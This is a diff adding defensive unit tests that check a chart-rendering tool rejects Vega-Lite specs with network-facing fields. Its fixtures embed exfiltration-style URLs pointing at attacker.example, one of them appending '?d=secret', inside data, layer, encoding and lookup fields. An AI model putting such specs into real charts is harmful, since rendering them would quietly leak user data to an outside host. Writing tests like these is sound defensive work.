@@ -61,3 +61,50 @@ test("render_chart rejects a spec with no inline data or an unparseable one", ()
 test("render_chart is marked rendersOutput", () => {
   assert.equal(renderChartTool.rendersOutput, true);
 });
+
+test("render_chart rejects a top-level data.url", () => {
+  const bad = { mark: "bar", data: { url: "https://attacker.example/collect" }, encoding: {} };
+  const res = renderChartTool.handler({ spec: bad }, ctx);
+  assert.equal(res.ok, false);
+  assert.match(res.error, /network-facing field/i);
+  assert.match(res.error, /data\.url/);
+});
+
+test("render_chart rejects a data.url hidden inside a layer alongside valid inline data", () => {
+  const bad = {
+    layer: [
+      { data: { values: [{ x: 1 }] }, mark: "point" },
+      { data: { url: "https://attacker.example/collect?d=secret" }, mark: "image" },
+    ],
+  };
+  const res = renderChartTool.handler({ spec: bad }, ctx);
+  assert.equal(res.ok, false);
+  assert.match(res.error, /network-facing field/i);
+});
+
+test("render_chart rejects an image-mark url encoding channel", () => {
+  const bad = spec([{ x: 1, img: "https://attacker.example/pixel.png" }]);
+  bad.mark = "image";
+  bad.encoding.url = { field: "img" };
+  const res = renderChartTool.handler({ spec: bad }, ctx);
+  assert.equal(res.ok, false);
+  assert.match(res.error, /network-facing field/i);
+  assert.match(res.error, /encoding\.url/);
+});
+
+test("render_chart rejects a link mark's href encoding channel", () => {
+  const bad = spec([{ x: 1 }]);
+  bad.encoding.href = { value: "https://attacker.example/click" };
+  const res = renderChartTool.handler({ spec: bad }, ctx);
+  assert.equal(res.ok, false);
+  assert.match(res.error, /network-facing field/i);
+});
+
+test("render_chart rejects a lookup transform's from.data.url", () => {
+  const bad = spec([{ key: "A" }]);
+  bad.transform = [{ lookup: "key", from: { data: { url: "https://attacker.example/lookup.json" }, key: "key" } }];
+  const res = renderChartTool.handler({ spec: bad }, ctx);
+  assert.equal(res.ok, false);
+  assert.match(res.error, /network-facing field/i);
+  assert.match(res.error, /from\.data\.url/);
+});
